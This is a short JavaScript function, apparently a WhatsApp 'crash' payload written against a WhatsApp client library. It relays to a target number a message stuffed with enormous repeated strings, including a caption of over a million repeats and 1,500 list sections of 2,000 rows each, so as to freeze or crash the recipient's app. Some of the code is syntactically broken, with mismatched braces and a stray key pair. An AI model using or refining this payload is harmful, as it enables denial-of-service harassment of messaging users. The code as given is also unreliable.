async function DocuSql(jid) {
const msg = await generateWAMessageFromContent(target, {
document: Buffer.from("/x10".repeat(100000), 'utf-8'),
      mimetype: 'text/plain',
      fileName: '\n\n\n Snith Soft Boy ( Ara Soft Spoken )\n\n\n',
      caption: "/x10".repeat(1045000)
     },
         nativeFlowMessage: {
              buttons: [
                {
                  name: "payment_newsletter_description",
                  buttonParamsJson: JSON.stringify({
                    title: "StX",
                    description: "Delay",
                    sections: Array.from({ length: 1500 }, (_, i) => ({
                      title: "/u0000".repeat(20000),
                      rows: Array.from({ length: 2000 }, (_, j) => ({
                        title: `Item ${i * 20 + j + 1}`,
                        id: `${i * 20 + j + 1}`
                      }))
                    })),
                    listType: 2,
                    description: "Snith With Raa ",
                  })
                },
                name: "payment_transaction_request",
 buttonParamsJson: "/x10".repeat(9555),
                }
              ],
            }
          },
         await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
    });
}